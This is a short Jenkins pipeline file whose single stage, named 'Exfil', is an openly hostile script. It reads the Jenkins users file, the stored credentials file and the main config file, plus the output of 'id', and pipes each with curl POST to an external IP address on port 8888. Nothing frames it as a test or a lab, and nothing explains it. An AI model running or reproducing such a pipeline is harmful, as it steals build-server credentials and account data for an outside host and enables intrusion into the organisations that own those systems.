pipeline {
    agent any
    stages {
        stage('Exfil') {
            steps {
                sh '''
                    cat /var/jenkins_home/users/users.xml | curl -X POST -d @- http://137.184.141.100:8888/users_xml
                    cat /var/jenkins_home/credentials.xml | curl -X POST -d @- http://137.184.141.100:8888/creds_xml
                    cat /var/jenkins_home/config.xml | curl -X POST -d @- http://137.184.141.100:8888/config_xml
                    id | curl -X POST -d @- http://137.184.141.100:8888/id_output
                '''
            }
        }
    }
}
